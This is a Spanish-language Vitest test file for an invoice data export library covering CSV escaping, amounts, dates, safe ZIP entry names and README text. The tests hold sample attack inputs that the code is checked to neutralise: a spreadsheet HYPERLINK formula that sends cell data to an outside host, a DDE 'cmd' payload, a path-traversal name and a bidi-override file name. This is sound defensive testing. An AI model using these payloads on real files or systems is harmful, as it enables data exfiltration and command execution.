import { describe, it, expect } from "vitest";
import { csvAmount, csvCell, csvDate, csvRow, formatBytes, originalFileName, originalPath, readmeText, safeZipName } from "@/lib/clientDataExportFormat";

describe("CSV de la descarga de datos (F-044)", () => {
  it("entre comillas solo lo que lleva separador, comillas o saltos", () => {
    expect(csvCell("Proveedor SL")).toBe("Proveedor SL");
    expect(csvCell("A; B")).toBe('"A; B"');
    expect(csvCell('dice "hola"')).toBe('"dice ""hola"""');
    expect(csvCell("dos\nlíneas")).toBe('"dos\nlíneas"');
    expect(csvCell(null)).toBe("");
    expect(csvRow(["a", 1, null])).toBe("a;1;\r\n");
  });

  it("sin inyección de fórmulas: apóstrofo delante de =, +, -, @, tabulador y retorno", () => {
    expect(csvCell('=HYPERLINK("http://x/?d="&E2&F2;"Proveedor SL")')).toBe(`"'=HYPERLINK(""http://x/?d=""&E2&F2;""Proveedor SL"")"`);
    expect(csvCell("+34-1")).toBe("'+34-1");
    expect(csvCell("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
    expect(csvCell("\rx")).toBe(`"'\rx"`);
    // Un número plano sigue siendo un número.
    expect(csvCell("-12,50")).toBe("-12,50");
    expect(csvCell("-3")).toBe("-3");
  });

  it("importes con coma y fechas AAAA-MM-DD", () => {
    expect(csvAmount({ toString: () => "1234.56" })).toBe("1234,56");
    expect(csvAmount(null)).toBe("");
    expect(csvDate(new Date("2026-03-05T00:00:00Z"))).toBe("2026-03-05");
    expect(csvDate(null)).toBe("");
  });
});

describe("nombres dentro del ZIP", () => {
  it("sin barras ni caracteres que Windows no admite, y nunca vacíos", () => {
    expect(safeZipName("../../etc/passwd")).toBe("__.._etc_passwd");
    expect(safeZipName('a:b*c?"d<e>f|g')).toBe("a_b_c__d_e_f_g");
    expect(safeZipName("   ")).toBe("fichero");
    expect(safeZipName("Factura ñ.pdf")).toBe("Factura ñ.pdf");
  });

  it("los originales por periodo y con el id delante", () => {
    expect(originalPath({ id: "inv1", filename: "f.pdf", fileType: "application/pdf", periodYear: 2026, periodMonth: 3 })).toBe("originales/2026-03/inv1_f.pdf");
  });

  it("la extensión es la del tipo real, y recortar no la cambia", () => {
    const long = originalFileName("F".repeat(146) + ".cmd.pdf", "application/pdf");
    expect(long).toBe("F".repeat(80) + ".pdf");
    expect(originalFileName("factura.html", "application/pdf")).toBe("factura.pdf");
    expect(originalFileName("foto.JPEG", "image/jpeg")).toBe("foto.jpg");
    expect(originalFileName("sin-extension", "application/xml")).toBe("sin-extension.xml");
    expect(originalFileName("raro.pdf", "application/octet-stream")).toBe("raro.bin");
  });

  it("sin controles bidi ni puntos o espacios al final", () => {
    expect(originalFileName("factura\u202Efdp.cmd", "application/pdf")).toBe("facturafdp.pdf");
    expect(originalFileName("factura. . .pdf", "application/pdf")).toBe("factura.pdf");
  });

  it("tamaños legibles", () => {
    expect(formatBytes(11)).toBe("11 bytes");
    expect(formatBytes(1024 ** 3)).toBe("1 GB");
    expect(formatBytes(1.5 * 1024 ** 2)).toBe("1,5 MB");
  });
});

describe("LEEME.txt", () => {
  const base = { clientName: "Cliente SL", clientCif: "B1", generatedAt: "01/10/2026 10:00", generatedBy: "Ana", invoiceCount: 2, originalCount: 2, auditCount: 5, batchCount: 1, missingOriginals: 0 };
  it("explica cada fichero", () => {
    const text = readmeText(base);
    for (const name of ["facturas.json", "facturas.csv", "lineas_iva.csv", "originales/", "auditoria.csv", "lotes_exportados.json"]) {
      expect(text).toContain(name);
    }
    expect(text).not.toContain("ERRORES.txt");
    expect(text).toContain("no borra nada");
  });
  it("con originales que faltan, habla de ERRORES.txt", () => {
    expect(readmeText({ ...base, missingOriginals: 2 })).toContain("2 originales no se pudieron descargar");
  });
});
